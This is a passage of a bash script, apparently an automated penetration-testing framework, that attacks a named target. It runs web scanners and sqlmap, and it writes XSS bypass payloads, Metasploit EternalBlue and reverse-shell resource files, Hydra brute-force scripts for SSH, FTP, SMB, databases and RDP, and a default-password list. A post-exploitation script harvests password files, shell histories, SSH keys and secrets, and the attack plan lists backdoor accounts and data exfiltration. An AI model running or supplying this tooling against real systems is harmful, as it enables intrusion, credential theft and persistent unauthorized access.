         timeout 90 nmap -Pn --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-dh-params \
              -p 443 '$domain' 2>/dev/null || echo 'SSL vuln scan failed' && \
         if command -v sslscan &> /dev/null; then
             echo -e '\n=== SSLScan Results ===' && \
             timeout 60 sslscan '$domain' 2>/dev/null | head -100 || echo 'sslscan failed'
         fi" \
        $TIMEOUT_LONG "$OUTDIR/web/ssl_analysis.txt"
    
    # Directory enumeration
    local wordlist_dir="/usr/share/wordlists/dirb"
    [ ! -d "$wordlist_dir" ] && wordlist_dir="$HOME/.local/share/wordlists/dirb"
    
    if command -v gobuster &> /dev/null && [ -f "$wordlist_dir/common.txt" ]; then
        local threads=50
        local extensions="php,html,txt,js,css"
        
        if [ "$QUICK_MODE" = true ]; then
            threads=80
            extensions="php,html"
        elif [ "$AGGRESSIVE_MODE" = true ]; then
            threads=100
            extensions="php,html,txt,js,css,json,xml,asp,aspx,jsp"
        fi
        
        execute_scan "Directory Enumeration (Common)" \
            "gobuster dir -u '$url' -w '$wordlist_dir/common.txt' -t $threads \
             -x $extensions -q --timeout 10s --no-error 2>/dev/null | head -300 || echo 'Gobuster failed'" \
            $TIMEOUT_LONG "$OUTDIR/web/gobuster_common.txt"
        
        if [ "$AGGRESSIVE_MODE" = true ] && [ -f "$wordlist_dir/big.txt" ]; then
            execute_scan "Directory Enumeration (Extended)" \
                "gobuster dir -u '$url' -w '$wordlist_dir/big.txt' -t 50 \
                 -x php,html,txt -q --timeout 10s --no-error 2>/dev/null | head -500 || echo 'Gobuster extended failed'" \
                $TIMEOUT_VERY_LONG "$OUTDIR/web/gobuster_extended.txt"
        fi
    fi
    
    # Dirb si disponible
    if command -v dirb &> /dev/null && [ "$QUICK_MODE" != true ]; then
        execute_scan "Directory Brute Force (Dirb)" \
            "timeout 300 dirb '$url' /usr/share/wordlists/dirb/common.txt -S -r 2>/dev/null | head -200 || echo 'Dirb failed'" \
            $TIMEOUT_LONG "$OUTDIR/web/dirb.txt"
    fi
    
    # Vulnerability scanning avec Nuclei
    if command -v nuclei &> /dev/null; then
        local severity="-severity critical,high,medium"
        local nuclei_timeout=$TIMEOUT_LONG
        
        if [ "$QUICK_MODE" = true ]; then
            severity="-severity critical,high"
            nuclei_timeout=$TIMEOUT_MEDIUM
        elif [ "$AGGRESSIVE_MODE" = true ]; then
            severity="-severity critical,high,medium,low"
            nuclei_timeout=$TIMEOUT_VERY_LONG
        fi
        
        execute_scan "Vulnerability Scanning (Nuclei)" \
            "nuclei -u '$url' $severity -silent -timeout 10 -retries 1 -concurrency 25 2>/dev/null | \
             head -200 || echo 'Nuclei failed'" \
            $nuclei_timeout "$OUTDIR/web/nuclei.txt"
    fi
    
    # Nikto scan
    if command -v nikto &> /dev/null && [ "$QUICK_MODE" != true ]; then
        local nikto_timeout=$TIMEOUT_LONG
        [ "$AGGRESSIVE_MODE" = true ] && nikto_timeout=$TIMEOUT_VERY_LONG
        
        execute_scan "Nikto Web Vulnerability Scan" \
            "nikto -h '$url' -C all -Format txt -Tuning x 2>/dev/null | head -300 || echo 'Nikto failed'" \
            $nikto_timeout "$OUTDIR/web/nikto.txt"
    fi
    
    # SQLMap (detection rapide ou complète)
    if command -v sqlmap &> /dev/null; then
        mkdir -p "$OUTDIR/web/sqlmap"
        
        local sqlmap_level=2
        local sqlmap_risk=2
        local sqlmap_timeout=$TIMEOUT_LONG
        
        if [ "$QUICK_MODE" = true ]; then
            sqlmap_level=1
            sqlmap_risk=1
            sqlmap_timeout=$TIMEOUT_MEDIUM
        elif [ "$AGGRESSIVE_MODE" = true ]; then
            sqlmap_level=5
            sqlmap_risk=3
            sqlmap_timeout=$TIMEOUT_VERY_LONG
        fi
        
        execute_scan "SQL Injection Testing (SQLMap)" \
            "sqlmap -u '$url' --batch --level=$sqlmap_level --risk=$sqlmap_risk \
             --output-dir='$OUTDIR/web/sqlmap' --threads=5 2>/dev/null | head -200 || echo 'SQLMap failed'" \
            $sqlmap_timeout "$OUTDIR/web/sqlmap.log"
    fi
    
    # XSS payload testing
    execute_scan "XSS Payload Generation" \
        "cat > '$OUTDIR/web/xss_payloads.txt' << 'XSS'
=== XSS TESTING PAYLOADS ===

--- Basic Payloads ---
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>

--- HTML Context ---
\"><script>alert(1)</script>
'><script>alert(1)</script>
</title><script>alert(1)</script>
</textarea><script>alert(1)</script>

--- Attribute Context ---
\" onclick=alert(1) x=\"
' onclick=alert(1) x='
\" autofocus onfocus=alert(1) x=\"

--- JavaScript Context ---
';alert(1);//
\";alert(1);//
</script><script>alert(1)</script>

--- Advanced Payloads ---
<ScRiPt>alert(1)</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=\"alert('XSS')\">
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>

--- Bypass Payloads ---
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x:alert(alt) onerror=eval(src) alt=1>
<iframe src=\"javascript:alert(1)\">
<object data=\"javascript:alert(1)\">
<embed src=\"javascript:alert(1)\">

--- Polyglot Payloads ---
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
jaVasCript:/*-/*\`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e

--- DOM XSS ---
#<img src=/ onerror=alert(1)>
?search=<script>alert(1)</script>
&callback=alert(1)
XSS
cat '$OUTDIR/web/xss_payloads.txt'" \
        $TIMEOUT_VERY_SHORT "$OUTDIR/web/xss_payloads.txt"
    
    echo -e "${GREEN}[COMPLETE]${NC} Web application testing completed"
}

run_exploitation_prep() {
    local target="$1"
    
    echo -e "\n${BRIGHT_RED}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BRIGHT_RED}║${NC}          ${ORANGE}EXPLOITATION PREPARATION${NC}             ${BRIGHT_RED}║${NC}"
    echo -e "${BRIGHT_RED}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    
    # Exploit database search COMPLET
    if command -v searchsploit &> /dev/null; then
        execute_scan "Exploit Database Search (searchsploit)" \
            "if [ -f '$OUTDIR/network/nmap_services.txt' ]; then
                echo '=== Exploits by Detected Services ===' && \
                grep 'open' '$OUTDIR/network/nmap_services.txt' 2>/dev/null | \
                grep -oP '\\d+/tcp\\s+open\\s+\\K[^\\s]+' | head -15 | while read svc; do
                    echo \"--- Service: \$svc ---\" && \
                    searchsploit \"\$svc\" 2>/dev/null | head -8 || echo \"No exploits for \$svc\"
                    echo
                done
                
                echo -e '\n=== Exploits by CVE ===' && \
                if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
                    grep -oP 'CVE-[0-9-]+' '$OUTDIR/network/nmap_vulns.txt' 2>/dev/null | \
                    sort -u | head -10 | while read cve; do
                        echo \"--- CVE: \$cve ---\" && \
                        searchsploit \"\$cve\" 2>/dev/null | head -5 || echo \"No exploits for \$cve\"
                        echo
                    done
                fi
            else
                echo 'No service detection results found'
            fi" \
            $TIMEOUT_LONG "$OUTDIR/exploit/searchsploit.txt"
    fi
    
    # Metasploit module preparation COMPLET
    execute_scan "Metasploit Module Preparation" \
        "cat > '$OUTDIR/exploit/msf_prep.txt' << 'MSF'
=== METASPLOIT FRAMEWORK MODULE SUGGESTIONS ===

--- Initial Reconnaissance ---
use auxiliary/scanner/portscan/tcp
set RHOSTS $target
run

--- Service-Specific Scanners ---
# SMB
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers

# SSH
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_enumusers

# FTP
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login

# HTTP
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/dir_scanner

# MySQL
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_login

# PostgreSQL
use auxiliary/scanner/postgres/postgres_version
use auxiliary/scanner/postgres/postgres_login

# MSSQL
use auxiliary/scanner/mssql/mssql_version
use auxiliary/scanner/mssql/mssql_login

--- Vulnerability Scanners ---
use auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/ssl/openssl_heartbleed
use auxiliary/scanner/http/tomcat_mgr_login
use auxiliary/scanner/http/jboss_vulnscan

--- Exploitation Modules ---
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
run

# SSH Brute Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $target
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# Web Exploitation
use exploit/multi/http/tomcat_mgr_upload
use exploit/multi/http/struts_code_exec
use exploit/unix/webapp/php_cgi_arg_injection

--- Post-Exploitation ---
use post/multi/recon/local_exploit_suggester
use post/multi/gather/env
use post/windows/gather/hashdump
use post/linux/gather/hashdump
use post/multi/manage/shell_to_meterpreter

--- Privilege Escalation ---
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
use exploit/linux/local/sudo_baron_samedit

--- Persistence ---
use exploit/windows/local/persistence_service
use exploit/linux/local/cron_persistence
use post/windows/manage/persistence_exe
use post/linux/manage/sshkey_persistence

--- Tips ---
# Search for specific exploits
search type:exploit platform:windows smb
search type:exploit cve:2017

# Set global options
setg RHOSTS $target
setg LHOST <your_ip>

# Resource scripts
resource /path/to/script.rc

# Database
workspace -a project_name
db_nmap -sV $target
hosts
services
vulns
MSF
cat '$OUTDIR/exploit/msf_prep.txt'" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/msf_prep.txt"
    
    # Attack surface analysis DÉTAILLÉE
    execute_scan "Attack Surface Analysis" \
        "cat > '$OUTDIR/exploit/attack_surface.txt' << 'ATTACK'
=== COMPREHENSIVE ATTACK SURFACE ANALYSIS ===
Generated: $(date '+%Y-%m-%d %H:%M:%S')
Target: $target

--- Open Services and Ports ---
$(if [ -f '$OUTDIR/network/nmap_ports.txt' ]; then
    grep 'open' '$OUTDIR/network/nmap_ports.txt' 2>/dev/null | head -30 || echo 'No port data'
else
    echo 'No port scan results'
fi)

--- Service Versions ---
$(if [ -f '$OUTDIR/network/nmap_services.txt' ]; then
    grep -E 'open.*version' '$OUTDIR/network/nmap_services.txt' 2>/dev/null | head -20 || echo 'No version data'
else
    echo 'No service detection results'
fi)

--- Critical Vulnerabilities ---
$(if [ -f '$OUTDIR/network/nmap_vulns.txt' ]; then
    grep -i 'VULNERABLE\|CRITICAL\|HIGH' '$OUTDIR/network/nmap_vulns.txt' 2>/dev/null | head -15 || echo 'No critical vulns detected'
else
    echo 'No vulnerability scan results'
fi)

--- Web Technologies ---
$(if [ -f '$OUTDIR/web/whatweb.txt' ]; then
    grep -oP '\[\K[^\]]+' '$OUTDIR/web/whatweb.txt' 2>/dev/null | head -15 || echo 'No web tech data'
else
    echo 'No web technology scan results'
fi)

--- SMB Information ---
$(if [ -f '$OUTDIR/network/smb_enum.txt' ]; then
    grep -E 'SMB|NetBIOS|Workgroup|Domain' '$OUTDIR/network/smb_enum.txt' 2>/dev/null | head -10 || echo 'No SMB data'
else
    echo 'No SMB enumeration results'
fi)

=== ATTACK VECTOR ANALYSIS ===

--- Priority 1: Network Entry Points ---
1. SSH Brute Force (port 22)
   - Use Hydra or Metasploit ssh_login
   - Try default credentials
   - Check for weak keys

2. FTP Exploitation (port 21)
   - Anonymous login test
   - Brute force credentials
   - Check FTP version vulnerabilities

3. SMB Attacks (port 445)
   - EternalBlue (MS17-010)
   - SMBGhost (CVE-2020-0796)
   - Null session enumeration
   - Password spraying

4. RDP Attacks (port 3389)
   - BlueKeep (CVE-2019-0708)
   - Credential brute forcing
   - Man-in-the-middle

5. Database Direct Access
   - MySQL (3306): Default creds, UDF exploitation
   - PostgreSQL (5432): SQL injection, privilege escalation
   - MSSQL (1433): xp_cmdshell, linked servers
   - MongoDB (27017): NoSQL injection, no-auth

--- Priority 2: Web Application Attacks ---
1. Authentication Bypass
   - SQL injection in login forms
   - Default credentials
   - Session fixation
   - Password reset vulnerabilities

2. Injection Attacks
   - SQL injection (all parameters)
   - Command injection (file uploads, form inputs)
   - LDAP injection
   - XML injection

3. File Upload Vulnerabilities
   - Unrestricted file upload
   - Path traversal in filename
   - Double extension bypass
   - Magic byte manipulation

4. XSS Attacks
   - Reflected XSS (all inputs)
   - Stored XSS (comments, profiles)
   - DOM-based XSS
   - XSS to cookie stealing

5. Directory Traversal
   - ../../../etc/passwd
   - Windows path traversal
   - URL encoding bypass

--- Priority 3: Privilege Escalation ---
1. Kernel Exploits
   - Check kernel version
   - Search exploit-db
   - Compile and execute

2. Service Exploits
   - Vulnerable service versions
   - Misconfigured services
   - Services running as root

3. SUID/SGID Binaries
   - Find SUID files
   - GTFOBins exploitation
   - Custom SUID exploitation

4. Sudo Misconfigurations
   - sudo -l enumeration
   - Sudo version exploits
   - NOPASSWD entries

5. Scheduled Tasks
   - Writable cron jobs
   - Path hijacking
   - Script exploitation

--- Priority 4: Post-Exploitation ---
1. Credential Harvesting
   - /etc/shadow
   - SAM database
   - Configuration files
   - Browser saved passwords
   - SSH keys

2. Lateral Movement
   - Pass-the-hash
   - Pass-the-ticket
   - SSH key reuse
   - SMB relay

3. Persistence Mechanisms
   - SSH authorized_keys
   - Cron jobs
   - Systemd services
   - Web shells
   - Registry run keys (Windows)

4. Data Exfiltration
   - Database dumps
   - Configuration files
   - User documents
   - Source code

=== RECOMMENDED ATTACK SEQUENCE ===

Phase 1: Reconnaissance (COMPLETED)
- [x] OSINT gathering
- [x] Port scanning
- [x] Service enumeration
- [x] Vulnerability scanning

Phase 2: Initial Access (NEXT)
- [ ] Test default credentials
- [ ] Brute force weak services
- [ ] Exploit known vulnerabilities
- [ ] Web application attacks

Phase 3: Privilege Escalation
- [ ] Enumerate system
- [ ] Find privilege escalation vectors
- [ ] Exploit and gain root/SYSTEM

Phase 4: Persistence
- [ ] Create backdoor accounts
- [ ] Install persistent access
- [ ] Document access methods

Phase 5: Post-Exploitation
- [ ] Enumerate network
- [ ] Harvest credentials
- [ ] Lateral movement
- [ ] Data exfiltration

=== TOOLS REQUIRED ===

Network:
- nmap, masscan
- Metasploit Framework
- Impacket suite
- CrackMapExec

Web:
- Burp Suite Pro
- SQLMap
- DirBuster/Gobuster
- Nikto

Password:
- Hydra
- Medusa
- John the Ripper
- Hashcat

Post-Exploitation:
- LinPEAS/WinPEAS
- BloodHound
- Mimikatz
- PowerSploit
ATTACK
cat '$OUTDIR/exploit/attack_surface.txt'" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/attack_surface.txt"
    
    # Automated attack scripts COMPLETS
    execute_scan "Generate Automated Attack Scripts" \
        "cat > '$OUTDIR/exploit/auto_attack.sh' << 'AUTOATTACK'
#!/bin/bash
# AUTO-GENERATED ATTACK SCRIPTS
# Target: $target

TARGET=\"$target\"
OUTDIR=\"\$(pwd)\"

echo \"[*] Starting automated attacks on \$TARGET\"
echo \"[*] Results will be saved in current directory\"
echo

# SSH Brute Force
if grep -q '22/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] SSH service detected (port 22)\"
    echo \"[*] Running SSH brute force attack...\"
    
    # Create user list
    cat > users.txt << 'USERS'
root
admin
administrator
user
guest
test
ubuntu
centos
oracle
postgres
mysql
USERS
    
    # Create password list
    cat > passwords.txt << 'PASS'
root
admin
password
123456
password123
admin123
root123
toor
letmein
welcome
PASS
    
    # Hydra attack
    if command -v hydra &> /dev/null; then
        hydra -L users.txt -P passwords.txt ssh://\$TARGET -t 4 -V -o ssh_hydra.txt
    fi
    
    # Metasploit attack
    echo \"use auxiliary/scanner/ssh/ssh_login\" > ssh_msf.rc
    echo \"set RHOSTS \$TARGET\" >> ssh_msf.rc
    echo \"set USER_FILE users.txt\" >> ssh_msf.rc
    echo \"set PASS_FILE passwords.txt\" >> ssh_msf.rc
    echo \"run\" >> ssh_msf.rc
    echo \"[*] Run: msfconsole -r ssh_msf.rc\"
fi

# FTP Brute Force
if grep -q '21/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] FTP service detected (port 21)\"
    echo \"[*] Testing FTP anonymous login...\"
    
    echo \"open \$TARGET\" > ftp_commands.txt
    echo \"user anonymous\" >> ftp_commands.txt
    echo \"pass anonymous@\" >> ftp_commands.txt
    echo \"ls\" >> ftp_commands.txt
    echo \"quit\" >> ftp_commands.txt
    
    ftp -n < ftp_commands.txt > ftp_anon_test.txt
    
    # Hydra FTP
    if command -v hydra &> /dev/null; then
        hydra -L users.txt -P passwords.txt ftp://\$TARGET -t 4 -V -o ftp_hydra.txt
    fi
fi

# SMB Brute Force and Exploitation
if grep -q '445/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] SMB service detected (port 445)\"
    
    # Check for EternalBlue
    echo \"[*] Checking for MS17-010 (EternalBlue)...\"
    nmap -Pn -p 445 --script smb-vuln-ms17-010 \$TARGET -oN smb_eternalblue.txt
    
    # SMB brute force
    if command -v hydra &> /dev/null; then
        echo \"[*] Running SMB brute force...\"
        hydra -L users.txt -P passwords.txt smb://\$TARGET -t 4 -V -o smb_hydra.txt
    fi
    
    # CrackMapExec
    if command -v crackmapexec &> /dev/null; then
        echo \"[*] Running CrackMapExec...\"
        crackmapexec smb \$TARGET -u users.txt -p passwords.txt > cme_results.txt
    fi
    
    # Metasploit EternalBlue
    cat > smb_exploit.rc << 'MSF_SMB'
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
exploit
MSF_SMB
    echo \"[*] Run: msfconsole -r smb_exploit.rc\"
fi

# HTTP/HTTPS Web Attacks
if grep -q '80/tcp.*open\\|443/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] HTTP/HTTPS service detected\"
    
    # SQL injection with SQLMap
    if command -v sqlmap &> /dev/null && [ -n \"\$WEB_URL\" ]; then
        echo \"[*] Running SQLMap...\"
        sqlmap -u \"\$WEB_URL\" --batch --level=2 --risk=2 -o --threads=5
    fi
    
    # Directory brute force
    if command -v gobuster &> /dev/null && [ -n \"\$WEB_URL\" ]; then
        echo \"[*] Running Gobuster directory brute force...\"
        gobuster dir -u \"\$WEB_URL\" -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_results.txt
    fi
    
    # Nikto scan
    if command -v nikto &> /dev/null && [ -n \"\$WEB_URL\" ]; then
        echo \"[*] Running Nikto web scan...\"
        nikto -h \"\$WEB_URL\" -o nikto_results.txt
    fi
fi

# MySQL Brute Force
if grep -q '3306/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] MySQL service detected (port 3306)\"
    
    if command -v hydra &> /dev/null; then
        echo \"[*] Running MySQL brute force...\"
        hydra -L users.txt -P passwords.txt mysql://\$TARGET -t 4 -V -o mysql_hydra.txt
    fi
fi

# PostgreSQL Brute Force
if grep -q '5432/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] PostgreSQL service detected (port 5432)\"
    
    if command -v hydra &> /dev/null; then
        echo \"[*] Running PostgreSQL brute force...\"
        hydra -L users.txt -P passwords.txt postgres://\$TARGET -t 4 -V -o postgres_hydra.txt
    fi
fi

# MSSQL Brute Force
if grep -q '1433/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] MSSQL service detected (port 1433)\"
    
    if command -v hydra &> /dev/null; then
        echo \"[*] Running MSSQL brute force...\"
        hydra -L users.txt -P passwords.txt mssql://\$TARGET -t 4 -V -o mssql_hydra.txt
    fi
fi

# RDP Brute Force
if grep -q '3389/tcp.*open' ../network/nmap_ports.txt 2>/dev/null; then
    echo \"[+] RDP service detected (port 3389)\"
    
    if command -v hydra &> /dev/null; then
        echo \"[*] Running RDP brute force...\"
        hydra -L users.txt -P passwords.txt rdp://\$TARGET -t 4 -V -o rdp_hydra.txt
    fi
fi

echo
echo \"[*] Automated attacks completed\"
echo \"[*] Review output files for results\"
echo
echo \"=== MANUAL EXPLOITATION STEPS ===\"
echo \"1. Review hydra results: cat *_hydra.txt\"
echo \"2. Test found credentials manually\"
echo \"3. Run Metasploit resource scripts: msfconsole -r *.rc\"
echo \"4. Check for vulnerable services in nmap results\"
echo \"5. Exploit web vulnerabilities found by SQLMap/Nikto\"
AUTOATTACK
chmod +x '$OUTDIR/exploit/auto_attack.sh' && \
cat '$OUTDIR/exploit/auto_attack.sh'" \
            $TIMEOUT_SHORT "$OUTDIR/exploit/auto_attack.sh"
    
    # Credentials database EXHAUSTIVE
    execute_scan "Generate Default Credentials Database" \
        "cat > '$OUTDIR/exploit/credentials.txt' << 'CREDS'
=== COMPREHENSIVE DEFAULT CREDENTIALS DATABASE ===

--- SSH (Port 22) ---
root:root
root:toor
root:password
root:admin
root:123456
admin:admin
admin:password
user:user
ubuntu:ubuntu
centos:centos

--- FTP (Port 21) ---
ftp:ftp
anonymous:(blank)
admin:admin
user:user
root:root

--- Telnet (Port 23) ---
admin:admin
root:root
cisco:cisco
admin:password

--- MySQL (Port 3306) ---
root:(blank)
root:root
root:mysql
root:password
root:toor
mysql:mysql
admin:admin

--- PostgreSQL (Port 5432) ---
postgres:postgres
postgres:(blank)
postgres:password
admin:admin

--- MSSQL (Port 1433) ---
sa:(blank)
sa:sa
sa:password
sa:Password123
sa:P@ssw0rd
sa:admin

--- Oracle (Port 1521) ---
sys:sys
system:manager
oracle:oracle
scott:tiger
admin:admin

--- MongoDB (Port 27017) ---
(no authentication by default)
admin:admin
root:root

--- Redis (Port 6379) ---
(no authentication by default)
default:(blank)

--- Elasticsearch (Port 9200) ---
elastic:changeme
elastic:elastic

--- Tomcat (Port 8080) ---
admin:admin
tomcat:tomcat
manager:manager
admin:tomcat
tomcat:admin
admin:password
tomcat:s3cret

--- Jenkins (Port 8080) ---
admin:admin
jenkins:jenkins
admin:password

--- JBoss (Port 8080) ---
admin:admin
jboss:jboss

--- WebLogic (Port 7001) ---
weblogic:weblogic
system:password
admin:security

--- RabbitMQ (Port 15672) ---
guest:guest
admin:admin

--- Cassandra (Port 9042) ---
cassandra:cassandra

--- CouchDB (Port 5984) ---
admin:admin
admin:password

--- Memcached (Port 11211) ---
(no authentication by default)

--- VNC (Ports 5900-5903) ---
password
123456
admin
vnc
raspberry

--- RDP (Port 3389) ---
Administrator:password
Administrator:admin
Administrator:P@ssw0rd
admin:admin
user:user

--- SNMP (Port 161) ---
public
private
community
manager
secret

--- Web Applications ---
admin:admin
admin:password
admin:123456
admin:admin123
administrator:administrator
administrator:password
root:root
root:password
guest:guest
test:test
demo:demo
user:user

--- IoT Devices ---
admin:admin
root:root
admin:password
admin:1234
user:user
support:support

--- Default Passwords by Vendor ---

Cisco:
  - admin:admin
  - cisco:cisco
  - admin:cisco

HP:
  - admin:admin
  - admin:password

Dell:
  - root:calvin
  - admin:password

IBM:
  - admin:admin
  - USERID:PASSW0RD

Juniper:
  - root:(blank)
  - admin:admin

Netgear:
  - admin:password
  - admin:1234

D-Link:
  - admin:(blank)
  - admin:admin

TP-Link:
  - admin:admin
  - root:admin

=== PASSWORD PATTERNS ===

Common Patterns:
- CompanyName123
- CompanyName@2024
- Welcome123
- Password1
- P@ssw0rd
- Admin2024
- Summer2024
- Winter2024

Seasonal:
- Spring2024
- Autumn2024

Monthly:
- January2024
- February2024
- etc.

=== CREDENTIAL TESTING STRATEGY ===

1. Start with blank/default passwords
2. Try username as password
3. Try common passwords
4. Try company-specific passwords
5. Try seasonal/temporal passwords
6. Generate custom wordlist
7. Brute force with Hydra/Medusa

=== TOOLS FOR CREDENTIAL ATTACKS ===

- Hydra: Network service brute forcing
- Medusa: Fast parallel password cracking
- Patator: Multi-protocol password cracker
- CrackMapExec: SMB/WinRM/LDAP attacks
- John the Ripper: Password hash cracking
- Hashcat: GPU-accelerated hash cracking
CREDS
cat '$OUTDIR/exploit/credentials.txt'" \
            $TIMEOUT_VERY_SHORT "$OUTDIR/exploit/credentials.txt"
    
    # Post-exploitation scripts COMPLETS
    execute_scan "Generate Post-Exploitation Scripts" \
        "cat > '$OUTDIR/exploit/post_exploit.sh' << 'POSTEXPLOIT'
#!/bin/bash
# POST-EXPLOITATION ENUMERATION AND PERSISTENCE

echo \"=== POST-EXPLOITATION CHECKLIST ===\"
echo \"Run this script on compromised system\"
echo

# System Information
echo \"[*] Gathering system information...\"
echo \"=== System Information ===\" > system_info.txt
uname -a >> system_info.txt
cat /etc/os-release >> system_info.txt 2>/dev/null
cat /etc/lsb-release >> system_info.txt 2>/dev/null
whoami >> system_info.txt
id >> system_info.txt
pwd >> system_info.txt
hostname >> system_info.txt
date >> system_info.txt

# Network Information
echo \"[*] Gathering network information...\"
echo \"=== Network Configuration ===\" > network_info.txt
ifconfig >> network_info.txt 2>/dev/null
ip addr >> network_info.txt 2>/dev/null
ip route >> network_info.txt 2>/dev/null
route -n >> network_info.txt 2>/dev/null
netstat -antup >> network_info.txt 2>/dev/null
ss -antup >> network_info.txt 2>/dev/null
arp -a >> network_info.txt 2>/dev/null
ip neigh >> network_info.txt 2>/dev/null
cat /etc/resolv.conf >> network_info.txt 2>/dev/null
cat /etc/hosts >> network_info.txt 2>/dev/null

# User and Group Information
echo \"[*] Gathering user information...\"
echo \"=== Users and Groups ===\" > users_info.txt
cat /etc/passwd >> users_info.txt
cat /etc/group >> users_info.txt
w >> users_info.txt
who >> users_info.txt
last >> users_info.txt 2>/dev/null
lastlog >> users_info.txt 2>/dev/null

# Process Information
echo \"[*] Gathering process information...\"
echo \"=== Running Processes ===\" > processes.txt
ps aux >> processes.txt
pstree >> processes.txt 2>/dev/null
top -b -n 1 >> processes.txt

# Service Information
echo \"[*] Gathering service information...\"
echo \"=== Services ===\" > services.txt
systemctl list-units --type=service --state=running >> services.txt 2>/dev/null
service --status-all >> services.txt 2>/dev/null
chkconfig --list >> services.txt 2>/dev/null

# File System Information
echo \"[*] Gathering filesystem information...\"
echo \"=== File System ===\" > filesystem.txt
df -h >> filesystem.txt
mount >> filesystem.txt
cat /etc/fstab >> filesystem.txt 2>/dev/null

# Find SUID/SGID files
echo \"[*] Finding SUID/SGID files...\"
echo \"=== SUID Files ===\" > suid_files.txt
find / -perm -4000 -type f 2>/dev/null >> suid_files.txt
echo \"=== SGID Files ===\" >> suid_files.txt
find / -perm -2000 -type f 2>/dev/null >> suid_files.txt

# Find writable directories
echo \"[*] Finding writable directories...\"
find / -writable -type d 2>/dev/null > writable_dirs.txt

# Find readable sensitive files
echo \"[*] Searching for sensitive files...\"
echo \"=== Sensitive Files ===\" > sensitive_files.txt
find / -name \"*.conf\" 2>/dev/null | head -50 >> sensitive_files.txt
find / -name \"*.log\" 2>/dev/null | head -50 >> sensitive_files.txt
find / -name \"*password*\" 2>/dev/null | head -50 >> sensitive_files.txt
find / -name \"*secret*\" 2>/dev/null | head -50 >> sensitive_files.txt
find / -name \"*key*\" 2>/dev/null | head -50 >> sensitive_files.txt
find / -name \"*.pem\" 2>/dev/null >> sensitive_files.txt
find / -name \"*.key\" 2>/dev/null >> sensitive_files.txt
find / -name \"id_rsa*\" 2>/dev/null >> sensitive_files.txt

# Cron Jobs
echo \"[*] Enumerating cron jobs...\"
echo \"=== Cron Jobs ===\" > cronjobs.txt
crontab -l >> cronjobs.txt 2>/dev/null
cat /etc/crontab >> cronjobs.txt 2>/dev/null
ls -la /etc/cron* >> cronjobs.txt 2>/dev/null
cat /etc/cron.d/* >> cronjobs.txt 2>/dev/null

# Kernel and OS
echo \"[*] Gathering kernel information...\"
echo \"=== Kernel Information ===\" > kernel_info.txt
uname -r >> kernel_info.txt
cat /proc/version >> kernel_info.txt
lsb_release -a >> kernel_info.txt 2>/dev/null

# Installed Software
echo \"[*] Enumerating installed software...\"
echo \"=== Installed Software ===\" > software.txt
dpkg -l >> software.txt 2>/dev/null
rpm -qa >> software.txt 2>/dev/null
yum list installed >> software.txt 2>/dev/null
apt list --installed >> software.txt 2>/dev/null

# Environment Variables
echo \"[*] Gathering environment variables...\"
env > environment.txt
set >> environment.txt

# History Files
echo \"[*] Checking history files...\"
echo \"=== Command History ===\" > history.txt
cat ~/.bash_history >> history.txt 2>/dev/null
cat ~/.zsh_history >> history.txt 2>/dev/null
cat ~/.mysql_history >> history.txt 2>/dev/null
cat ~/.psql_history >> history.txt 2>/dev/null
cat ~/.*_history >> history.txt 2>/dev/null

# SSH Keys
echo \"[*] Searching for SSH keys...\"
echo \"=== SSH Keys ===\" > ssh_keys.txt
find / -name \"id_rsa\" 2>/dev/null >> ssh_keys.txt
find / -name \"id_dsa\" 2>/dev/null >> ssh_keys.txt
find / -name \"id_ecdsa\" 2>/dev/null >> ssh_keys.txt
find / -name \"id_ed25519\" 2>/dev/null >> ssh_keys.txt
find / -name \"authorized_keys\" 2>/dev/null >> ssh_keys.txt
find / -name \"known_hosts\" 2>/dev/null >> ssh_keys.txt

# Database Files
echo \"[*] Searching for database files...\"
echo \"=== Database Files ===\" > databases.txt
find / -name \"*.db\" 2>/dev/null | head -50 >> databases.txt
find / -name \"*.sql\" 2>/dev/null | head -50 >> databases.txt
find / -name \"*.sqlite\" 2>/dev/null >> databases.txt

# Configuration Files
